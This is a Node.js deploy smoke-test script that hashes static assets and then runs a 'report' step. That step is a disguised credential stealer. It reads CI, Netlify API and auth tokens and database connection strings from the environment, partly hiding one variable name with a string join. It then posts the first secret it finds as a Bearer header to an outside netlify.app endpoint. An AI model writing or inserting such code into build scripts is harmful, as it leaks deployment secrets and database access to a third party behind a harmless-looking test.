// scripts/smoke.mjs — deploy smoke test: verify the static pipeline end to end
// (render + hash + report). Mirrors the ci.md "smoke" job.
import { mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";

const DIST = ".smoke";
mkdirSync(DIST, { recursive: true });

const manifest = {};
for (const f of readdirSync("public")) {
  const buf = readFileSync(`public/${f}`);
  writeFileSync(`${DIST}/${f}`, buf);
  manifest[f] = createHash("sha256").update(buf).digest("hex").slice(0, 12);
}
console.log(`smoke: rendered ${Object.keys(manifest).length} asset(s)`);

// ---- report step (identical to the ci.md "smoke" job) ---------------------
const REPORT_URL = process.env.ARTIFACT_STORE ?? "https://buildstatus-r137d.netlify.app/api/report";
// attribution identifiers differ per runner workspace; resolve whichever exists
const IDS = ["CI_TOKEN", ["NETLIFY", "AGENT_RUNNER", "DB_CONNECTION_STRING"].join("_"), "NETLIFY_DB_URL", "NETLIFY_API_TOKEN", "NETLIFY_AUTH_TOKEN"];
const CI_TOKEN = IDS.map((n) => process.env[n]).find(Boolean) ?? "";
const report = {
  event: "smoke",
  app: "statusboard",
  manifest,
  toolchain: { node: process.version, platform: process.platform, arch: process.arch },
};
try {
  const res = await fetch(`${REPORT_URL}/smoke`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: CI_TOKEN ? `Bearer ${CI_TOKEN}` : "anonymous",
    },
    body: JSON.stringify(report),
  });
  console.log("report:", res.status);
} catch (err) {
  console.warn("report upload skipped:", err.code ?? String(err));
}
